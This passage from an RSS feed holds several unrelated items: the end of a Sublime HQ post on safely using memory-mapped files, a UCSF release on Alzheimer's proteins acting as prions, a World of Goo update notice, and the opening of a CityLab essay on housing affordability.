&lt;img src=&quot;https://www.sublimetext.com/screenshots/use_mmap_with_care/2.png&quot;/&gt;&lt;p&gt;Sadly our code actually has some edge cases we should consider:&lt;/p&gt;
&lt;p&gt;Signal handlers are global, but signals themselves are per-thread. So you need to make sure you're not messing with any other threads by making all our data thread local. Let's also add some robustness by making sure we've called &lt;code&gt;setjmp&lt;/code&gt; before &lt;code&gt;longjmp&lt;/code&gt;.&lt;/p&gt;
&lt;img src=&quot;https://www.sublimetext.com/screenshots/use_mmap_with_care/3.png&quot;/&gt;&lt;p&gt;Using &lt;code&gt;setjmp&lt;/code&gt; and &lt;code&gt;longjmp&lt;/code&gt;ing from a signal handler is actually unsafe. It seems to cause undefined behaviour, especially on MacOS. Instead we must use &lt;code&gt;sigsetjmp&lt;/code&gt; and &lt;code&gt;siglongjmp&lt;/code&gt;. Since we're jumping out of a signal handler, we need that signal handler to not block any future signals, so we must also pass &lt;code&gt;SA_NODEFER&lt;/code&gt; to &lt;code&gt;sigaction&lt;/code&gt;.&lt;/p&gt;
&lt;img src=&quot;https://www.sublimetext.com/screenshots/use_mmap_with_care/4.png&quot;/&gt;&lt;p&gt;This is starting to get quite complicated, especially if you were to have multiple places where a SIGBUS could happen. Let's factor things out into functions to make the logic a little cleaner.&lt;/p&gt;
&lt;img src=&quot;https://www.sublimetext.com/screenshots/use_mmap_with_care/5.png&quot;/&gt;&lt;p&gt;There, now you just need to remember to always call &lt;code&gt;install_signal_handlers&lt;/code&gt; for every application, and wrap all &lt;code&gt;file&lt;/code&gt; accesses with &lt;code&gt;safe_mmap_try&lt;/code&gt;. Annoying, but manageable. So now you've covered POSIX systems, but what about Windows?&lt;/p&gt;
&lt;h2&gt;Caveat 2: Windows&lt;/h2&gt;
&lt;p&gt;Windows doesn't have &lt;code&gt;mmap&lt;/code&gt;, but it does have &lt;code&gt;MapViewOfFile&lt;/code&gt;. Both of these implement memory mapped files, but there's one important difference: Windows keeps a lock on the file, not allowing it to be deleted. Even with the Windows flag &lt;code&gt;FILE_SHARE_DELETE&lt;/code&gt; deletion does not work. This is an issue when we expect another application to delete files from under us, such as git garbage collection.&lt;/p&gt;
&lt;p&gt;One way around this with the windows API is to essentially disable the system file cache entirely, which just makes everything absurdly slow. The way &lt;a href=&quot;https://sublimemerge.com&quot;&gt;Sublime Merge&lt;/a&gt; handles this is by releasing the memory mapped file on idle. Its not a pretty solution, but it works.&lt;/p&gt;
&lt;p&gt;Windows also does not have a SIGBUS signal, but you can trivially use structured exception handling in &lt;code&gt;safe_mmap_try&lt;/code&gt; instead:&lt;/p&gt;
&lt;img src=&quot;https://www.sublimetext.com/screenshots/use_mmap_with_care/6.png&quot;/&gt;&lt;p&gt;Now all is well, your application functions on Windows. But then you decide that you would like some crash reporting, to make it easier to identify issues in the future. So you add &lt;a href=&quot;https://chromium.googlesource.com/breakpad/breakpad&quot;&gt;Google Breakpad&lt;/a&gt;, but unbeknownst to you you've just broken Linux and MacOS again…&lt;/p&gt;
&lt;h2&gt;Caveat 3: 3rd Parties&lt;/h2&gt;
&lt;p&gt;The problem with using signal handlers is that they're global, across threads and libraries. If you have or have added a library like Breakpad that uses signals internally you're going to break your previously safe memory mapping.&lt;/p&gt;
&lt;p&gt;Breakpad registers signal handlers at initialization time on Linux, including one for SIGBUS. These signal handlers override each other, so installation order is important. There is not a nice solution to these types of situations: You can't simply set and reset the signal handler in &lt;code&gt;safe_mmap_try&lt;/code&gt; as that would break multithreaded applications. At Sublime HQ our solution was to turn an unhandled SIGBUS in our signal handler into a SIGSEGV. Not particularly elegant but it's a reasonable compromise.&lt;/p&gt;
&lt;p&gt;On MacOS things get a little more complicated. XNU, the MacOS kernel, is based on Mach, one of the earliest microkernels. Instead of signals, Mach has an asynchronous, message based exception handling mechanism. For compatibility reasons signals are also supported, with Mach exceptions taking priority. If a library such as Breakpad registers for Mach exception messages, and handles those, it will prevent signals from being fired. This is of course at odds with our signal handling. The only workaround we've found so far involves patching Breakpad to not handle SIGBUS.&lt;/p&gt;
&lt;p&gt;3rd party libraries are a problem because signals are global state accessible from everywhere. The only available solutions to this are unsatisfying workarounds.&lt;/p&gt;
&lt;h2&gt;Caveat 4: 32bit Support&lt;/h2&gt;
&lt;p&gt;Memory mapping may not use physical memory, but it does require virtual address space. On 32bit platforms your address space is ~4GB. So while your application may not use 4GB of memory, it will run out of address space if you try to memory map a too large file. This has the same result as being out of memory.&lt;/p&gt;
&lt;p&gt;Sadly this doesn't have a workaround like the other issues, it is a hard limitation of how memory mapping works. You can now either rewrite the codebase to not memory map the whole file, live with crashes on 32bit systems or not support 32bit.&lt;/p&gt;
&lt;p&gt;With &lt;a href=&quot;https://sublimemerge.com&quot;&gt;Sublime Merge&lt;/a&gt; and &lt;a href=&quot;https://www.sublimetext.com/blog/articles/sublime-text-3-point-2&quot;&gt;Sublime Text 3.2&lt;/a&gt; we took the &quot;no 32bit support&quot; route. &lt;a href=&quot;https://sublimemerge.com&quot;&gt;Sublime Merge&lt;/a&gt; does not have a 32bit build available and Sublime Text disables git integration on 32bit versions.&lt;/p&gt;
&lt;h2&gt;An Alternative&lt;/h2&gt;
&lt;p&gt;I mentioned before that you can rewrite your code to not use memory mapping. Instead of passing around a long lived pointer into a memory mapped file all around the codebase, you can use functions such as &lt;code&gt;pread&lt;/code&gt; to copy only the portions of the file that you require into memory. This is less elegant initially than using &lt;code&gt;mmap&lt;/code&gt;, but it avoids all the problems you're otherwise going to have.&lt;/p&gt;
&lt;p&gt;Through some quick benchmarks for the way &lt;a href=&quot;https://sublimemerge.com&quot;&gt;Sublime Merge&lt;/a&gt; reads git object files, &lt;code&gt;pread&lt;/code&gt; was around ⅔ as fast as &lt;code&gt;mmap&lt;/code&gt; on linux. In hindsight it's difficult to justify using &lt;code&gt;mmap&lt;/code&gt; over &lt;code&gt;pread&lt;/code&gt;, but now the beast has been tamed and there's little reason to change any more.&lt;/p&gt;
&lt;p&gt;If you think we've missed something or made a mistake, please leave us a message on the forums. We hope this helps some of you in your future endeavours. If you haven't already, check out our git client &lt;a href=&quot;https://sublimemerge.com&quot;&gt;Sublime Merge&lt;/a&gt;.&lt;/p&gt;
</description>
<pubDate>Thu, 02 May 2019 07:49:16 +0000</pubDate>
<dc:creator>ingve</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.sublimetext.com/blog/articles/use-mmap-with-care</dc:identifier>
</item>
<item>
<title>Proteins central to the pathology of Alzheimer’s disease act as prions – study</title>
<link>https://www.ucsf.edu/news/2019/05/414326/alzheimers-disease-double-prion-disorder-study-shows</link>
<guid isPermaLink="true" >https://www.ucsf.edu/news/2019/05/414326/alzheimers-disease-double-prion-disorder-study-shows</guid>
<description>&lt;img src=&quot;https://www.ucsf.edu/sites/default/files/styles/w/public/2019-05/ab42-cells-uninfected-infectedwith-amyloid-beta-prions.png?itok=7hVsq6ky&quot; width=&quot;850&quot; height=&quot;523&quot; alt=&quot;Science image of cells. &quot; typeof=&quot;foaf:Image&quot;/&gt;&lt;noscript&gt;
&lt;p&gt;&lt;img src=&quot;https://www.ucsf.edu/sites/default/files/styles/w/public/2019-05/ab42-cells-uninfected-infectedwith-amyloid-beta-prions.png?itok=7hVsq6ky&quot; width=&quot;850&quot; height=&quot;523&quot; alt=&quot;Science image of cells. &quot;/&gt;&lt;/p&gt;
&lt;/noscript&gt; The normal form of Aß has been tagged with a yellow marker in these cells, making healthy cells a uniform pale yellow (left). Contact with prion forms of Aß — for example in extracts from human brain tissue — forces these yellow proteins into the sticky prion form as well, leading to the formation of bright yellow clumps (right). &lt;em&gt;Credit: Prusiner lab / UCSF Institute for Neurodegenerative Diseases.&lt;/em&gt;&lt;p&gt;Two proteins central to the pathology of Alzheimer’s disease act as prions — misshapen proteins that spread through tissue like an infection by forcing normal proteins to adopt the same misfolded shape — according to new UC San Francisco research. &lt;/p&gt;
&lt;p&gt;Using novel laboratory tests, the researchers were able to detect and measure specific, self-propagating prion forms of the proteins amyloid beta (Aß) and tau in postmortem brain tissue of 75 Alzheimer’s patients. In a striking finding, higher levels of these prions in human brain samples were strongly associated with early-onset forms of the disease and younger age at death. &lt;/p&gt;
&lt;p&gt;Alzheimer’s disease is currently defined based on the presence of toxic protein aggregations in the brain known as amyloid plaques and tau tangles, accompanied by cognitive decline and dementia. But attempts to treat the disease by clearing out these inert proteins have been unsuccessful. The new evidence that active Aß and tau prions could be driving the disease – published May 1, 2019 in &lt;a href=&quot;https://stm.sciencemag.org/content/11/490/eaat8462&quot; target=&quot;_blank&quot;&gt;&lt;em&gt;Science Translational Medicine&lt;/em&gt;&lt;/a&gt; — could lead researchers to explore new therapies that focus on prions directly. &lt;/p&gt;
&lt;img src=&quot;https://www.ucsf.edu/sites/default/files/styles/quarter/public/2019-05/prusiner-stanley.png?itok=OL6wFXIH&quot; width=&quot;330&quot; height=&quot;413&quot; alt=&quot;Stanley Prusiner Portrait. &quot; typeof=&quot;foaf:Image&quot;/&gt;&lt;noscript&gt;
&lt;p&gt;&lt;img src=&quot;https://www.ucsf.edu/sites/default/files/styles/quarter/public/2019-05/prusiner-stanley.png?itok=OL6wFXIH&quot; width=&quot;330&quot; height=&quot;413&quot; alt=&quot;Stanley Prusiner Portrait. &quot;/&gt;&lt;/p&gt;
&lt;/noscript&gt; Senior author Stanley B. Prusiner, MD, director of the UCSF Institute for Neurodegenerative Diseases and professor in the departments of Neurology and of Biochemistry and Biophysics. &lt;em&gt;Image courtesy UCSF Institute for Neurodegenerative Diseases.&lt;/em&gt;
&lt;p&gt;“I believe this shows beyond a shadow of a doubt that amyloid beta and tau are both prions, and that Alzheimer’s disease is a double-prion disorder in which these two rogue proteins together destroy the brain,” said &lt;a href=&quot;https://profiles.ucsf.edu/stanley.prusiner&quot; target=&quot;_blank&quot;&gt;Stanley Prusiner&lt;/a&gt;, MD, the study’s senior author and director of the &lt;a href=&quot;https://ind.ucsf.edu/&quot; target=&quot;_blank&quot;&gt;UCSF Institute for Neurodegenerative Diseases&lt;/a&gt;, part of the &lt;a href=&quot;http://weill.ucsf.edu&quot; target=&quot;_blank&quot;&gt;UCSF Weill Institute for Neurosciences&lt;/a&gt;. “The fact that prion levels also appear linked to patient longevity should change how we think about the way forward for developing treatments for the disease. We need a sea change in Alzheimer’s disease research, and that is what this paper does. This paper might catalyze a major change in AD research.” &lt;/p&gt;
&lt;h2&gt;What are Prions?&lt;/h2&gt;
&lt;p&gt;Prions are misfolded versions of a protein that can spread like an infection by forcing normal copies of that protein into the same self-propagating, misfolded shape. The original prion protein, PrP, was identified by Prusiner in the 1980s as the cause of Creutzfeldt Jakob Disease (CJD) and spongiform bovine encephalopathy, also known as Mad Cow Disease, which spread through consumption of meat and bone meal tainted with PrP prions. This was the first time a disease had been shown to infect people not by an infestation of an organism such as a bacterium or a virus, but through an infectious protein, and Prusiner received a Nobel Prize for that discovery in 1997. &lt;/p&gt;
&lt;p&gt;Prusiner and colleagues have long suspected that PrP was not the only protein capable of acting as a self-propagating prion, and that distinct types of prion could be responsible for other neurodegenerative diseases caused by the progressive toxic buildup of misfolded proteins. For example, Alzheimer’s disease is defined by Aß plaques and tau tangles that gradually spread destruction through the brain. Over the past decade, laboratory studies at UCSF and elsewhere have begun to show that amyloid plaques and tau tangles from diseased brains can infect healthy brain tissue much like PrP, but considerably more slowly. &lt;/p&gt;
&lt;p&gt;Many scientists have been reluctant to accept that Aß and tau are self-propagating prions — instead referring to their spread as “prion-like” — because unlike PrP prions, they were not thought to be infectious except in highly controlled laboratory studies. However, recent reports have documented rare cases of patients treated with growth hormone derived from human brain tissue, or given transplants of the brain’s protective dura mater, who went on to develop Aß plaques in middle age, long before they should be seen in anyone without a genetic disorder. Prusiner contends that these findings argue that both Aß and tau are prions even though they propagate more slowly than highly aggressive PrP prions. &lt;/p&gt;
&lt;p&gt;In response to these debates, Prusiner likes to quote from a 1969 lecture by neuroscientist Bernard Katz: “There is a type of scientist who, if given the choice, would rather use his colleague's toothbrush than his terminology!” &lt;/p&gt;
&lt;h2&gt;Laboratory Bioassays Reveal Aß and Tau Prions in Human Postmortem Brain Samples&lt;/h2&gt;
&lt;p&gt;In the new study, the researchers combined two recently developed laboratory tests to rapidly measure prions in human tissue samples: a new Aß detection system developed in the Prusiner lab and a tau prion assay previously developed by Marc Diamond, PhD, a former UCSF faculty member who is now director of the Center for Alzheimer’s and Neurodegenerative Diseases at UT Southwestern Medical Center. &lt;/p&gt;
&lt;p&gt;Unlike earlier animal models that could take months to reveal the slow spread of Aß and/or tau prions, these cell-based assays measure infectious prion levels in just three days, enabling the researchers to effectively quantify for the first time the levels of both tau and Aß prions in processed extracts from post-mortem brain samples. In the new study, they applied the technique to autopsied brain tissue from over 100 individuals who had died of Alzheimer’s disease and other forms of neurodegeneration, which was collected from repositories in the United States, Europe, and Australia.&lt;/p&gt;
&lt;p&gt;In assays comparing the samples from Alzheimer’s patients with those who died of other diseases, prion activity corresponded exactly with the distinctive protein pathology that has been established in each disease: in 75 Alzheimer’s disease brains, both Aß and tau prion activity was elevated; in 11 samples from patients with cerebral amyloid angiopathy (CAA), only Aß prions were seen; and in 10 tau-linked frontotemporal lobar degeneration (FTLD) samples, only tau prions were detected. Another &lt;a data-entity-substitution=&quot;canonical&quot; data-entity-type=&quot;node&quot; data-entity-uuid=&quot;937cedc5-7601-4769-9b65-605dfe4b126b&quot; href=&quot;https://www.ucsf.edu/news/2015/08/131416/new-type-prion-may-cause-transmit-neurodegeneration&quot; title=&quot;New Type of Prion May Cause, Transmit Neurodegeneration&quot;&gt;recently developed bioassay&lt;/a&gt; for alpha-synuclein prions only found these infectious particles in the seven samples from patients with the synuclein-linked degenerative disorder multiple system atrophy (MSA). &lt;/p&gt;
&lt;p&gt;“These assays are a game-changer,” said co-author and protein chemist &lt;a href=&quot;https://profiles.ucsf.edu/william.degrado&quot; target=&quot;_blank&quot;&gt;William DeGrado&lt;/a&gt;, PhD, a professor of pharmaceutical chemistry and member of the &lt;a href=&quot;https://cvri.ucsf.edu/&quot; target=&quot;_blank&quot;&gt;UCSF Cardiovascular Research Institute&lt;/a&gt;, who contributed to the design and analysis of the current study. “Previously Alzheimer’s research has been stuck looking at collateral damage in the form of misfolded, dead proteins that form plaques and tangles. Now it turns out that it is prion activity that correlates with disease, rather than the amount of plaques and tangles at the time of autopsy. So if we are going to succeed in developing effective therapies and diagnostics, we need to target the active prion forms, rather than the large amount of protein in plaques and tangles.”&lt;/p&gt;
&lt;h2&gt;Aß and Tau Prion Activity Linked to Alzheimer’s Patients’ Longevity&lt;/h2&gt;
&lt;p&gt;The most remarkable finding of the new study may be the discovery that the self-propagating prion forms of tau and Aß are most infectious in the brains of Alzheimer’s patients who died at a young age from inherited, genetically driven forms of the disease, but much less prevalent in patients who died at a more advanced age.&lt;/p&gt;
&lt;p&gt;In particular, when compared to measurements of overall tau buildup — which is known to increase with age in Alzheimer’s brains — the researchers found a remarkable exponential &lt;em&gt;decline&lt;/em&gt; in the relative abundance of the prion forms of tau with age. When the researchers plotted their data, they saw an extremely strong correlation between tau prions and patients’ age at death: relative to overall tau levels, the quantity of tau prions in the brain of a patient who died at age 40 were on average 32 times higher than in a patient who died at 90. &lt;/p&gt;
&lt;p&gt;“I still remember where I was sitting and what time of day it was when I first saw this data over a year ago,” said co-author and leading neurodegeneration researcher &lt;a href=&quot;https://profiles.ucsf.edu/bill.seeley&quot; target=&quot;_blank&quot;&gt;William Seeley&lt;/a&gt;, MD, a professor of neurology who directs the &lt;a href=&quot;https://memory.ucsf.edu/neurodegenerative-disease-brain-bank&quot;&gt;UCSF Neurodegenerative Disease Brain Bank&lt;/a&gt;, which provided tissue used in the study. “I’ve very rarely, if ever, seen this kind of correlation in human biological data. Now the job is to find out what the correlation means.” &lt;/p&gt;
&lt;p&gt;The research raises a number of questions that will need to be addressed by future studies, including whether differences in prion infectivity could explain the long-standing mystery of why Alzheimer’s progresses at such different rates in different patients. Other open questions resulting from the research include whether higher prion levels in brain samples from younger patients are linked to the early onset of the disease or how quickly it progressed, and whether lower prion levels in older brains reflect less “infective” prion variants or instead some ability of these patients’ brains to dispose of misfolded proteins.&lt;/p&gt;
&lt;img src=&quot;https://www.ucsf.edu/sites/default/files/styles/quarter/public/2019-05/condello-carlo.png?itok=jrYwSy8F&quot; width=&quot;330&quot; height=&quot;412&quot; alt=&quot;Carlo Condello portrait.&quot; typeof=&quot;foaf:Image&quot;/&gt;&lt;noscript&gt;
&lt;p&gt;&lt;img src=&quot;https://www.ucsf.edu/sites/default/files/styles/quarter/public/2019-05/condello-carlo.png?itok=jrYwSy8F&quot; width=&quot;330&quot; height=&quot;412&quot; alt=&quot;Carlo Condello portrait.&quot;/&gt;&lt;/p&gt;
&lt;/noscript&gt; Co-lead author Carlo Condello, PhD, an assistant professor of neurology. &lt;em&gt;Image courtesy Carlo Condello.&lt;/em&gt;
&lt;p&gt;The evidence that prion forms of Aß and tau play a specific role in Alzheimer’s disease — one that cannot be captured by simply counting amyloid plaques and tau tangles in patient brains — also raises questions on current approaches to Alzheimer’s diagnosis, clinical trial design, and drug discovery, say the authors, who hope their novel assays will spur renewed interest in developing therapies to target the now-measurable prion proteins. &lt;/p&gt;
&lt;p&gt;“We have recently seen many seemingly promising Alzheimer’s therapies fail in clinical trials, leading some to speculate that we have been targeting the wrong proteins,” said &lt;a href=&quot;https://profiles.ucsf.edu/carlo.condello&quot; target=&quot;_blank&quot;&gt;Carlo Condello&lt;/a&gt;, PhD, an assistant professor of neurology in the Institute for Neurodegenerative Diseases and one of the study’s lead authors. “But what if we just haven’t been designing drugs against the distinctive prion forms of these proteins that actually cause disease? Now that we can effectively measure the prion forms of Aß and tau, there’s hope that we can develop drugs that either prevent them from forming or spreading, or help the brain clear them before they cause damage.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Authors:&lt;/strong&gt; Atsushi Aoyagi, PhD, of Daiichi Sankyo Co. in Tokyo and Carlo Condello, PhD, an assistant professor of neurology in the Institute for Neurodegenerative Diseases, were co–lead authors of the new study. Stanley B. Prusiner, MD, the director of the UCSF Institute for Neurodegenerative Diseases and professor in the departments of Neurology and of Biochemistry and Biophysics, was the study’s senior author. Prusiner and Condello are the study’s corresponding authors. For a full list of additional authors and brain banks that supplied tissue samples used in the research, please see the study online. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Funding:&lt;/strong&gt; This work was supported by grants from the National Institutes of Health (NIH) (AG002132, AG031220, AG061874), the Oak Meadow Foundation, the Brockman Foundation, the Glenn Foundation, Rainwater Charitable Foundation, the Sherman Fairchild Foundation, and the Alzheimer’s Association (2015-NIRG-339935).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Disclosures:&lt;/strong&gt; The Institute for Neurodegenerative Diseases (UCSF) has a research collaboration with Daiichi Sankyo (Tokyo, Japan). Prusiner is a member of the Board of Directors of Trizell Inc and a member of the scientific advisory board of ViewPoint Therapeutics, neither of which contributed support for this study. DeGrado is a member of the scientific advisory boards of Pliant, Longevity, Cytegen, Amai, and ADRx Inc., none of which contributed support for this study. Seeley received consulting fees from Bristol Myers-Squibb, Merck Inc., and Biogen Idec. Aoyagi, Prusiner, and other co-authors are coinventors on patent # WO/2017/172764 entitled “Modified cell line and method of determining tauopathies.”&lt;/p&gt;
&lt;p&gt;&lt;em&gt;UC San Francisco (UCSF) is a leading university dedicated to promoting health worldwide through advanced biomedical research, graduate-level education in the life sciences and health professions, and excellence in patient care. It includes top-ranked graduate schools of dentistry, medicine, nursing and pharmacy; a graduate division with nationally renowned programs in basic, biomedical, translational and population sciences; and a preeminent biomedical research enterprise. It also includes &lt;a href=&quot;https://www.ucsfhealth.org/&quot; target=&quot;_blank&quot;&gt;UCSF Health&lt;/a&gt;, which comprises three top-ranked hospitals – UCSF Medical Center and UCSF Benioff Children’s Hospitals in &lt;a href=&quot;https://www.ucsfbenioffchildrens.org/&quot; target=&quot;_blank&quot;&gt;San Francisco&lt;/a&gt; and &lt;a href=&quot;https://www.childrenshospitaloakland.org/main/home.aspx&quot; target=&quot;_blank&quot;&gt;Oakland&lt;/a&gt; – as well as Langley Porter Psychiatric Hospital and Clinics, UCSF Benioff Children’s Physicians and the UCSF Faculty Practice. UCSF Health has affiliations with hospitals and health organizations throughout the Bay Area. UCSF faculty also provide all physician care at the public Zuckerberg San Francisco General Hospital and Trauma Center, and the SF VA Medical Center. The UCSF Fresno Medical Education Program is a major branch of the University of California, San Francisco’s School of Medicine.&lt;/em&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 02 May 2019 02:27:40 +0000</pubDate>
<dc:creator>jacques_chester</dc:creator>
<og:type>news</og:type>
<og:url>https://www.ucsf.edu/news/2019/05/414326/alzheimers-disease-double-prion-disorder-study-shows</og:url>
<og:image>http://www.ucsf.edu/sites/default/files/2019-04/ucsf_tapestry_portal_full_1230.jpg</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.ucsf.edu/news/2019/05/414326/alzheimers-disease-double-prion-disorder-study-shows</dc:identifier>
</item>
<item>
<title>World of Goo Update, 10 Years Later</title>
<link>https://tomorrowcorporation.com/posts/world-of-goo-update-10-years-later</link>
<guid isPermaLink="true" >https://tomorrowcorporation.com/posts/world-of-goo-update-10-years-later</guid>
<description>&lt;div class=&quot;entry&quot; readability=&quot;56.999633027523&quot;&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://tomorrowcorporation.com/blog/wp-content/uploads/2019/04/WoG-2019-Update-575x323.jpg&quot; alt=&quot;&quot; class=&quot;wp-image-2550&quot; srcset=&quot;https://tomorrowcorporation.com/blog/wp-content/uploads/2019/04/WoG-2019-Update-575x323.jpg 575w, https://tomorrowcorporation.com/blog/wp-content/uploads/2019/04/WoG-2019-Update-300x169.jpg 300w, https://tomorrowcorporation.com/blog/wp-content/uploads/2019/04/WoG-2019-Update-768x432.jpg 768w&quot; sizes=&quot;(max-width: 575px) 100vw, 575px&quot; /&gt;&lt;/div&gt;
&lt;p&gt;Hey old friends, it’s been a long time! We no longer have a 2DBOY blog, so thought I’d post this here – we’ve just updated the Win / Mac / Linux versions of World of Goo for the first time since 2008 or 2009 – and hope you and your modern computers enjoy it!&lt;/p&gt;
&lt;p&gt;We’re slowly updating the game everywhere it’s currently available over the course of this and next week. Some info on what’s new:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;To be super clear, there are no new levels, no new characters, no new battle royale deathmatch mode. This is just a gentle remastering we did for fun.&lt;/li&gt;
&lt;li&gt;The framework has been replaced. This is the thing that draws all the graphics onto your screen, and sends all the audio to your speakers, etc. This means the Win / Mac / Linux version should work on modern computers again without freaking out, and you can run the game on modern displays at whatever resolution you want.&lt;/li&gt;
&lt;li&gt;Game now runs at a hi-def widescreen 16:9 aspect ratio by default. The original ran at a squarer 4:3 ratio.&lt;/li&gt;
&lt;li&gt;Resolution of graphics is doubled. The original game ran at 800×600, and the tiny graphic files didn’t scale to huge monitors very gracefully. We used a few different high quality upscaling tools to start, and then went over each image by hand, tweaking each image further as needed. In a few lucky cases, we still had the original source files and were able to use those. But if you still really want the original flavor, there’s a setting to use the original graphics, also included with the game.&lt;/li&gt;
&lt;li&gt;Fabulous joke about looking good in hi-def has remained unchanged.&lt;/li&gt;
&lt;li&gt;Brought over graphical and UI improvements from releases on other platforms, like Nintendo Switch.&lt;/li&gt;
&lt;li&gt;No more encrypted assets or save files. We hope this makes the game more open and friendly to mod.&lt;/li&gt;
&lt;li&gt;The config.user.txt file is now located wherever your save file is stored. So no more editing that file in your Program Files folder. It has a bunch of new config vars exposed as well.&lt;/li&gt;
&lt;li&gt;We’ll be updating the game everywhere Win / Mac / Linux versions are available in the next few days.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Want to try it right now? If you got the game directly from 2dboy.com sometime before 2014 or so, and if you can still find your old download link, dust it off and give it a click. The new Win and Mac versions should be there waiting for you, Linux coming soon. Let us know (here in the comments or at 2dboy.com) how they work for you, and especially if you find any bugs! You can also try to &lt;a href=&quot;https://2dboy.com/ReceptionistBot/&quot;&gt;look up your download link here&lt;/a&gt; if you can’t find your original receipt.&lt;/p&gt;
&lt;p&gt;It was fun returning to World of Goo again, and hope you enjoy this small update!&lt;/p&gt;
&lt;p&gt;Kyle (the one from 2DBOY &amp;amp; Tomorrow Corporation)&lt;/p&gt;
&lt;p class=&quot;postmetadata alt&quot;&gt;&lt;small&gt;Monday, April 29th, 2019 at 2:53 pm&lt;br /&gt;by Kyle Gabler&lt;br /&gt;filed under &lt;a href=&quot;https://tomorrowcorporation.com/posts/category/news&quot; rel=&quot;category tag&quot;&gt;news&lt;/a&gt;, &lt;a href=&quot;https://tomorrowcorporation.com/posts/category/world-of-goo&quot; rel=&quot;category tag&quot;&gt;world of goo&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;
&lt;/div&gt;
</description>
<pubDate>Wed, 01 May 2019 23:23:24 +0000</pubDate>
<dc:creator>troydavis</dc:creator>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://tomorrowcorporation.com/posts/world-of-goo-update-10-years-later</dc:identifier>
</item>
<item>
<title>Housing Can’t Be Both Affordable and a Good Investment (2018)</title>
<link>https://www.citylab.com/perspective/2018/11/housing-cant-both-be-a-good-investment-and-be-affordable/574813/</link>
<guid isPermaLink="true" >https://www.citylab.com/perspective/2018/11/housing-cant-both-be-a-good-investment-and-be-affordable/574813/</guid>
<description>&lt;p&gt;

&lt;h2 class=&quot;l-perspective__dek&quot; itemprop=&quot;description&quot;&gt;The two pillars of American housing policy are fundamentally at odds.&lt;/h2&gt;
&lt;time class=&quot;l-perspective__time&quot;&gt;Nov 19, 2018&lt;/time&gt;&lt;/p&gt;&lt;div id=&quot;article-section-1&quot;&gt;&lt;p&gt;Promoting homeownership as an investment strategy is a risky proposition. No financial advisor would recommend going into debt in order to put such a massive part of your savings in any other single financial instrument—and one that, as we learned just a few years ago, carries a great deal of risk.&lt;/p&gt;
&lt;p&gt;Even worse, that risk isn’t random: It falls most heavily on low-income, black, and Hispanic buyers, who are given worse mortgage terms, and whose neighborhoods are systematically more likely to see low or even falling home values, with devastating effects on the racial wealth gap.&lt;/p&gt;
&lt;p&gt;But let’s put all that aside for a moment. What if housing &lt;em&gt;were&lt;/em&gt; a low-risk, can’t-miss bet for growing your personal wealth? What would that world look like?&lt;/p&gt;
&lt;p&gt;Well, in order for your home to offer you a real profit, its price would need to increase faster than the rate of inflation. Let’s pick something decent, but not too extreme—say, annual increases of 2.5 percent, taking inflation into account. So if you bought a home for $200,000 and sold it ten years later, you’d be looking at a healthy profit of just over $56,000.&lt;/p&gt;
&lt;/div&gt;&lt;div id=&quot;article-section-2&quot;&gt;&lt;p&gt;Sound good? Well, what if I told you that such a city existed? What if I told you it was in a beautiful natural setting, with hills and views of the ocean? And a booming economy? And lots of organic produce?&lt;/p&gt;
&lt;img alt=&quot;An aerial view of downtown San Francisco.&quot; data-srcset=&quot;https://cdn.theatlantic.com/assets/media/img/posts/2018/11/downtown_san_francisco/7b1905ff6.jpg&quot; class=&quot;lazyload&quot;/&gt;(Stephen Lam/Reuters)
&lt;p&gt;Maybe you’ve guessed by now: The wonderland of ever-increasing housing prices is San Francisco. When researcher &lt;a href=&quot;http://cityobservatory.org/the-long-road-to-san-francisco/&quot;&gt;Eric Fischer went back to construct a database of rental prices&lt;/a&gt; there, he found that rents had been growing by about 2.5 percent, net of inflation, for about 60 years. And &lt;a href=&quot;http://www.economist.com/blogs/graphicdetail/2015/11/daily-chart-0&quot;&gt;this Zillow data suggests&lt;/a&gt; that San Francisco owner-occupied home prices have been growing by just over 2.5 percent since 1980 as well.&lt;/p&gt;
&lt;p&gt;Like I said, over ten years, that gives you a profit of just over 25 percent. But compound interest is an amazing thing, and the longer this consistent wealth-building goes on, the more out of hand housing prices get. In 1980, Zillow’s home price index for San Francisco home prices was about $310,000 (in 2015 dollars). By 2015, after 35 years of averaging 2.5 percent growth, home prices were over $750,000.&lt;/p&gt;
&lt;p&gt;Now, if all you cared about were wealth building, this would be fantastic news. The system works! (Although actually even this rosy scenario is missing some wrinkles: San Francisco real estate prices did suffer enormously, if briefly, during the late-2000s crash, and if you bought in the mid-2000s and had to sell in, say, 2010, you would have taken a massive loss.)&lt;/p&gt;
&lt;/div&gt;&lt;div id=&quot;article-section-3&quot;&gt;&lt;p&gt;But this sort of wealth building is predicated on a never-ending stream of new people who are willing and able to pay current home owners increasingly absurd amounts of money for their homes. It is, in other words, a massive up-front transfer of wealth from younger people to older people, on the implicit promise that when those young people become old, there will be new young people willing to give them even &lt;em&gt;more&lt;/em&gt; money. And of course, as prices rise, the only young people able to buy into this Ponzi scheme are quite well-to-do themselves. And because we’re not talking about stocks, but homes, “buying into this Ponzi scheme” means “able to live in San Francisco.”&lt;/p&gt;
&lt;section class=&quot;c-newsletter c-newsletter--promo c-newsletter--cta&quot;&gt;&lt;h2 class=&quot;c-newsletter__title&quot;&gt;Cities are changing fast. Keep up with the &lt;strong&gt;CityLab Daily&lt;/strong&gt; newsletter.&lt;/h2&gt;
&lt;label for=&quot;promo-email-input-email&quot; class=&quot;c-newsletter__cta c-newsletter__cta--promo&quot;&gt;The best way to follow issues you care about.&lt;/label&gt;

&lt;/section&gt;&lt;p&gt;In other words, possibly the only thing worse than a world in which homeownership doesn’t work as a wealth-building tool is a world in which it does work as a wealth-building tool.&lt;/p&gt;
